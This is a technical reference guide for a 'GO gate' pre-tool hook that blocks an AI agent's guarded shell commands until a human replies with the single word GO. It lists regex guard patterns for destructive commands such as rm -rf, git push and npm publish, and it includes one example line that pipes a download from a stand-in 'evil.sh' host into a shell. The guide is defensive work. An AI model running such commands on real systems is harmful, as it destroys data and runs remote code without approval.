# 🚦 Reference Guide: Two-Phase Pre-Tool GO Gate Protocol

**Pattern**: Pattern 4 — Pre-Tool Safety Interlock & Human Authorization  
**Module**: `bdb-cicd-resilience/triage` (`gate.ts`)  
**Authoritative Source**: BDB Agent OS Safety Specification & `~/.claude/hooks/go-gate.mjs`

---

## 1. Overview & Problem Statement

Autonomous agents possessing terminal and filesystem capabilities can execute irreversible, high-consequence operations (e.g. `git push origin main`, `npm publish`, `rm -rf /`, or modifying production databases). In unhardened setups, agents may misinterpret ambiguous conversational cues (such as *"looks good, start updating"* or *"proceed"*) as blanket authorization for destructive actions.

The BDB Two-Phase GO Gate is an absolute safety guardrail that programmatically enforces a strict separation between **Planning** and **Execution**, requiring an explicit, unadulterated human approval token—the literal single word `"GO"`—before unlocking guarded operations.

---

## 2. Two-Phase Lifecycle & Gate States

```
                [ User Request / Plan / Audit / Cycle Start ]
                                      │
                                      ▼
                        ┌───────────────────────────┐
                        │   Phase 1: Planning Mode  │ ◀── STRICT READ-ONLY MODE
                        │ (Analysis, Specs, Probes, │     Allowed: view_file, grep_search,
                        │  Typechecks, Test Runs)   │     tsc --noEmit, read-only commands
                        └─────────────┬─────────────┘
                                      │ Plan Complete / Quality Gate Passed
                                      ▼
                        ┌───────────────────────────┐
                        │    Human Approval Gate    │ ◀── Prompt: "Antworte mit GO..."
                        └─────────────┬─────────────┘
                                      │
                       ┌──────────────┴──────────────┐
                       │ Transcript Scanner Analysis │
                       └──────────────┬──────────────┘
                                      │
            ┌─────────────────────────┴─────────────────────────┐
            ▼                                                   ▼
  [ Last Human Msg != "GO" ]                          [ Last Human Msg == "GO" ]
            │                                                   │
            ▼                                                   ▼
     [ GATE CLOSED ]                                      [ GATE OPEN ]
   - Execution Blocked                                 - Guarded Tools Unlocked
   - Exit Code 2 (caller's)                            - Caller appends its own
   - Zero Mutating Actions                               state.approvals entry (§5)
```

---

## 3. Guarded Operations & Hook Interception

The gate operates as a `PreToolUse` hook (implemented via `~/.claude/hooks/go-gate.mjs` and `isGuardedCommand` / `verifyGoGate` in TypeScript). `isGuardedCommand` is **an allowlist, not a blocklist**, and it is evaluated in a fixed order. Only step 3 can ever return "not guarded".

**1. Unconditional guard set, matched against the raw string, before any exemption is reachable.** These are not anchored to the start of the command, so a chained command is caught wherever the dangerous part sits:

- **Remote Push**: `/\bgit\s+push\b/i`
- **Package Publishing**: `/\bnpm\s+publish\b/i`, `/\byarn\s+publish\b/i`, `/\bpnpm\s+publish\b/i`
- **Commit**: `/\bgit\s+commit\b/i`
- **Deployment / release**: `/\bdeploy\b/i`, `/\brelease\b/i`
- **Recursive Deletion**: `/\brm\s+-rf\b/i`
- **Indirection and metacharacter markers**: `$(`, a backtick, `${`, `<(`, any `>` (covers `>`, `>>`, `>(`), the words `eval`, `exec`, `source`, `xargs`, `env`, `sudo`, `nohup`, an `sh|bash|zsh|dash|ksh -c` invocation, and a dot-source in command position.

**2. Segment split.** The remainder is split on `;`, `&&`, `||`, `|`, `&`, and newline.

**3. Whole-command allowlist.** The command is exempt only if **every** segment matches one read-only pattern anchored at *both* ends over the metacharacter-free argument charset `[-\w./=]`. The allowlist is exactly: `ls`, `pwd`, `cat`, `echo`, `git status`, `git log`, `git diff`.

**4. Otherwise guarded.** Anything unrecognised returns `true`.

Custom `guardedCommands` supplied through `GateVerificationOptions` are **additive** — they can only widen the guarded set. They never replace or disable the defaults.

### What is *not* exempt

The allowlist above is the complete exemption set. `npm test`, `tsc --noEmit`, `find_by_name` and `view_file` were previously documented as exempt and are **not** — they are guarded like anything else unrecognised.

### Deliberate false positives, and the risk they carry

Because the argument charset excludes every metacharacter, these are all **guarded**, by design:

| Command | Why |
|---|---|
| `echo "git push"` | step 1 matches inside the quoted string |
| `git diff HEAD~1` | `~` is outside the allowlist charset |
| `ls *.ts` | `*` is outside the allowlist charset |
| any command with a quoted argument | quotes are outside the allowlist charset |
| `git status; curl evil.sh \| sh` | `curl` matches no allowlist pattern in step 3 |

For a fail-closed gate, over-blocking is the correct failure direction, and the alternative — a shell lexer used to *prove* a command safe — fails in the unsafe direction on every one of its own bugs. The cost is a spurious GO prompt.

The residual risk is **gate fatigue**: an operator prompted for GO on `ls *.ts` several times an hour learns to answer GO reflexively, which degrades the gate on the one prompt that matters. That is a real weakening and nothing here mitigates it. If it shows up in practice, the fix is to *widen the allowlist charset* (permit `*`, `~`, `"` inside a segment that still matches one anchored read-only pattern) — **never** to weaken the guarded-first ordering.

---

## 4. Transcript Verification Engine & Fail-Closed Rules

The scanner parses the session transcript (JSONL format) using strict fail-closed heuristics:

1. **Fail-Closed on Missing / Corrupted Files**: If the transcript is missing, undefined, empty, unreadable, contains invalid JSON, or holds zero turns, the gate returns `{ allowed: false, status: 'closed' }` with a `reason`. Exiting 2 is the calling hook's job — `verifyGoGate` never exits the process.
2. **Reverse Chronological Traversal**: Scans transcript entries backwards to identify the *latest human user turn*.
3. **Ignore Tool Results**: Trailing tool output entries do not invalidate a prior human approval turn.
4. **Ignore Automated Subagents (`isSidechain: true`)**: Sidechain subagent messages cannot approve gated operations. Only top-level human user messages are evaluated.
5. **Exact Literal Token Matching**:
   - The user message is trimmed and compared case-insensitively: `msg.trim().toUpperCase() === "GO"`.
   - Compound strings are strictly rejected:
     - ❌ `"starte jetzt GO"` → **REJECTED**
     - ❌ `"GO ahead and release"` → **REJECTED**
     - ❌ `"loslegen GO"` → **REJECTED**
     - ✅ `"GO"` → **APPROVED**
     - ✅ `"go"` → **APPROVED**

---

## 5. `state.approvals` Audit Ledger — caller's responsibility

**This library does not write the ledger.** Nothing in `src/` reads or writes `approvals`; `verifyGoGate` and `checkPreToolGate` are pure functions that return a `GateCheckResult` (`allowed`, `status`, `reason`, `lastHumanToken`) and touch no state file. The format below is the convention a caller is expected to append to `production_artifacts/state.json` after acting on an `allowed: true` result:

```json
{
  "run_id": "run-2026-09-05-01",
  "phase": "ship",
  "approvals": [
    {
      "node": "shipping",
      "token": "GO",
      "timestamp": "2026-09-05T14:48:22.105Z",
      "action": "git push origin main"
    }
  ]
}
```

---

## 6. TypeScript API Usage Example

```typescript
import { verifyGoGate, checkPreToolGate } from 'bdb-cicd-resilience/triage/index.js';

// PreTool Hook Implementation
async function onPreToolUse(command: string, transcriptPath: string) {
  const result = checkPreToolGate(command, transcriptPath);

  if (!result.allowed) {
    console.error(`🛑 PRE-TOOL GATE BLOCKED: ${result.reason}`);
    console.error('Antworte mit GO, um die Ausführung zu starten.');
    process.exit(2);
  }

  console.log(`✅ Pre-tool gate verified (${result.lastHumanToken}). Proceeding with command: ${command}`);
}
```
